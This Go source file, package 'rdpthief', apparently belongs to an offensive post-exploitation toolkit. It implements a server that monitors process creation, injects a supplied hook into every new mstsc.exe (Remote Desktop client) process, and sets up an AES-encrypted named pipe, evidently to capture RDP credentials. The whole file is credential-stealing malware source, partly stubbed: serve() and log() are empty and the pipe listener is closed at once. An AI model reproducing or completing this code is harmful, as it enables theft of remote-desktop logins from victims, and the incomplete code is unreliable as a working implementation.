package rdpthief

import (
	"context"
	"crypto/sha256"
	"net"
	"sync"

	"github.com/Microsoft/go-winio"

	"project/internal/crypto/aes"
	"project/internal/logger"
	"project/internal/module/taskmgr"
	"project/internal/security"
)

// Injector is used to inject hook to the mstsc process.
type Injector func(pid uint32, hook []byte) error

// Config contains configuration about rdpthief server.
type Config struct {
	PipeName string
	Password string
	Hook     []byte // resource
}

// Server is used to watch process list and inject hook
// to the new created process ("mstsc.exe").
type Server struct {
	logger   logger.Logger
	injector Injector
	callback Callback
	hook     *security.Bytes

	cbc     *aes.CBC
	monitor *taskmgr.Monitor

	ctx       context.Context
	cancel    context.CancelFunc
	closeOnce sync.Once
	wg        sync.WaitGroup
}

// NewServer is used to create a rdpthief server.
func NewServer(logger logger.Logger, injector Injector, callback Callback, cfg *Config) (*Server, error) {
	srv := Server{
		logger:   logger,
		injector: injector,
		callback: callback,
		hook:     security.NewBytes(cfg.Hook),
	}
	passHash := sha256.Sum256([]byte(cfg.Password))
	cbc, err := aes.NewCBC(passHash[:], passHash[:aes.IVSize])
	if err != nil {
		return nil, err
	}
	taskmgrOpts := new(taskmgr.Options) // only need PID
	monitor, err := taskmgr.NewMonitor(logger, srv.taskEventHandler, taskmgrOpts)
	if err != nil {
		return nil, err
	}
	listener, err := winio.ListenPipe(`\\.\pipe\`+cfg.PipeName, nil)
	if err != nil {
		return nil, err
	}

	srv.cbc = cbc
	srv.monitor = monitor

	listener.Close()

	return &srv, nil

}

func (srv *Server) log() {

}

func (srv *Server) taskEventHandler(_ context.Context, event uint8, data interface{}) {
	if event != taskmgr.EventProcessCreated {
		return
	}
	for _, process := range data.([]*taskmgr.Process) {
		if process.Name != "mstsc.exe" {
			continue
		}
		srv.injectHook(process)
	}
}

func (srv *Server) injectHook(process *taskmgr.Process) {
	hook := srv.hook.Get()
	defer srv.hook.Put(hook)
	err := srv.injector(uint32(process.PID), hook)
	if err != nil {
		srv.log()
	}
}

func (srv *Server) serve(listener net.Listener) {

}
